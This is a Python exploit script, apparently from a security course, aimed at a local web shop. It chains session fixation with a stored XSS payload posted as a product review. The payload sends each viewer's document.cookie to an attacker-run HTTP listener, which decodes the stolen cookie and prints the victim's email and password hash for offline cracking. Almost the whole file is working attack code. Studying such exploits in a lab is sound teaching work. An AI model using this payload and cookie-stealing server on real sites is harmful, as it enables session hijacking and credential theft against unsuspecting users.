import requests
import sys
import base64
import re

url_login = "http://localhost:8888/login"
url = "http://localhost:8888/products/5/rate?"

if sys.version_info[0] < 3:
    # python 2 import
    from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
else:
    # python 3 import
    from http.server import BaseHTTPRequestHandler, HTTPServer

class BaseServer(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        self.wfile.write("<html><body><p>hello, world!</p></body></html>".encode('utf-8'))

    def do_HEAD(self):
        self._set_headers()
        
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        self._set_headers()
        self.wfile.write("<html><body><p>POST!</p><p>%s</p></body></html>".encode('utf-8') % post_data)

        #If the user has the user-info cookie
        if(len(post_data)!=0):
            print("\nOne user has just watched your comment and she/he has the user-info cookie! His values are the following: ")
            
            #Decoding the post_data and getting the email and the password
            email, hash_password = self.parseCookie(post_data)

            #Show information
            print("\n\tEmail: " + str(email))
            print("\tHash password: " + str(hash_password))


        
    def parseCookie(self, encoded_cookie: bytes) -> tuple:
        #This method parse the cookie and show the handy information within it

        #First of all, decode the cookie
        decoded_cookie = base64.b64decode(encoded_cookie).decode('utf-8',errors='ignore').strip()

        #Match any available string
        match = re.findall("<string>(.*)<\/string>", str(decoded_cookie))

        email = match[0]
        hash_password = match[1]

        return email, hash_password

    def crackHash():
        pass


        
def run(server_class=HTTPServer, handler_class=BaseServer, port=80):
    '''
    
    '''
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print('HTTP server running on port %s'% port)

    httpd.handle_request()




def showMessage():
    print("\nScript 1: Group 3. Security Application")

    print("\nThis script take advantage of 4 vulnerabilities of target website")
    print("\t1-CWE-384: Session Fixation. The server does not renovate the jsessioid cookie after successful login")
    print("\t2-CWE-79: XSS. Javascript code can be inserted in form fields")
    print("\t3-CWE-285: Improper Access Control 2")
    print("\t4-CWE-200: Exposure of Sensitive Information to an Unauthorized Actor")

    print("""\nThis is script is going to ask you any valid credentials to perform a XSS attack by writing a comment with javascript code.
          When a user sees our comment on website, the user-info cookie is going to be stolen thanks to XSS attack.
          This kind of cookie contains the email and the hashed password so we can use john the ripper tool to crack it
          The exploit will set up a simple http server in order to listen to requests and get the user-info cookie
          """)




def askCredentials() -> tuple:
    '''
    This method asks the user which email and password he/she wants to use
    '''
    
    username = input("Which email user you want to use?: ")
    password = input("Type the password: ")

    return username, password

def askProductId() -> int:
    '''
    This method asks the user in which productId he/she wants to write the comment using XSS
    '''

    productId = input("In which product you want to write a comment using XSS attack?: ")
    return productId



def getCookie():
    '''
    This method does one get request and returns the obtained cookie
    It is possible due to application doesn't renovate the cookie after doing login
    '''

    r1 = requests.get("http://localhost:8888/")
    return r1.cookies

def doLogin(username: str, password: str, cookie, session) -> str:
    '''
    This method performs login by using the given credentials and the cookie in this session.
    '''

    #Define the request headers
    headers = {
    "Host": "192.168.217.1:8888",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://192.168.217.1:8888/login",
    "Connection": "keep-alive",
    }

    #Define the request data specifying the username and the password 
    
    
    data = {
        "email": str(username),
        "password": str(password),
        "_rememberMe": "on",
    }

    """
    data = {
        "email": "test@test.com",
        "password": "test",
        "_rememberMe": "on",
    }
    """ 
    

    #Do the request using the session, headers, data and cookie
    response = session.post(url_login, headers=headers, data=data, cookies=cookie)

    if((int(str(response.text).find("login")) == -1)):
       print("\nSuccessful Login!")
       return True
    else:
        print("\nUnexpected Error. Make sure that you specified the credentials correctly")
        return False


def doRateWithXSS(productId, cookie, session):
    '''
    This method rates a product taking advantage of one vulnerability and writes in the comment field a XSS attack
    Basically, when one a user sees our comment, if he/she is using user-info cookie, we are going to retrive that.
    This method exploits two vulnerabilities 
        1 - XSS attack
        2 - user-info cookie is not set HTTPOnly 
    '''

    #Define the request headers
    headers = {
    "Host": "192.168.217.1:8888",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://localhost:8888/products/6/rate?",
    "Connection": "keep-alive",
    }

    #Define the request data specifying the username and the password 
    data = {
    "productId": str(productId),
    "rating": "5",
    "text": "<script> fetch('http://localhost/', { method: 'POST', mode: 'no-cors', body: document.cookie });</script>",
    }

    response = session.post(url, headers=headers, data=data,cookies=cookie)

    success_string = int(str(response.text).find("Product review added"))

    if (success_string == -1):
        print("Error adding the rating with comment")
    else:
        print("Comment added successfully")








if __name__ == '__main__':

    showMessage()


    #First of all, ask credentials and product id to user
    email, password = askCredentials()
    productId = askProductId()

    cookie = getCookie()

    session = requests.Session()

    if(doLogin(email, password, cookie, session)):
        doRateWithXSS(productId, cookie, session)
        

    #Once we have done this, we have to set up the server and wait until one user sees our comment to steal his cookie
    #https://gist.githubusercontent.com/bmcculley/e716d7326d6a7b0edfd6a33feef6840e/raw/a1cb47145c0d161971e2b63a3f04cf4453c930ef/dummy-web-server.py

    print("\nSetting up the web server....")

    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()

    